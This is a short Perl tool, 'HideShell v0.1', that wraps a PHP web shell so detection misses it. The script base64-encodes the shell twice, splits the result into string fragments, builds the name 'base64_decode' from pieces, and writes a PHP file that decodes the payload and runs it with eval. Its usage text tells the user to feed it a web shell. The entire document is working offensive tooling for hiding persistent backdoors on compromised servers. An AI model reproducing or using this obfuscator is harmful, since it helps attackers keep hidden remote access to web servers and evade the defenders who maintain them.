################# HideShell v0.1 #########

##########################################

# Coded by J.M. Fernández (The X-C3LL)

# Blog: 0verl0ad.blogspot.com

# Twitter: @TheXC3LL

#########################################





# IMPORTANT: YOU NEED TO DELETE <?PHP and ?> IN YOUR SHELL BEFORE USE THIS TOOL



use MIME::Base64;





unless ($ARGV == 2) { &help; }



open(FILEA, "<", $ARGV[0]);

open(FILEB, ">>", $ARGV[1]);



@shell = <FILEA>;

$shell = join("", @shell);


$base1 = encode_base64($shell);

$base2 = encode_base64($base1);



$size = length($base2);

$i = 0;



print FILEB '<?php $z = ""; ';



while ($i < $size) {

	$prob = substr($base2, $i, 4);

	print FILEB '$z .= "'.$prob.'";'."\n";

	$i = $i + 4;

}



print FILEB '$a = "base"; $b = "64_decode"; $c = $a.$b; $string = $c($z); $string = $c($string); EVAL ($string); ?>';

close(FILEA);

close(FILEB);

sub help {
print q(
  perl hideshell.pl webshell.php output.php
  
  REMEMBER: you have to delete initial <?php and final ?> in your webshell before use this tool
  );
}
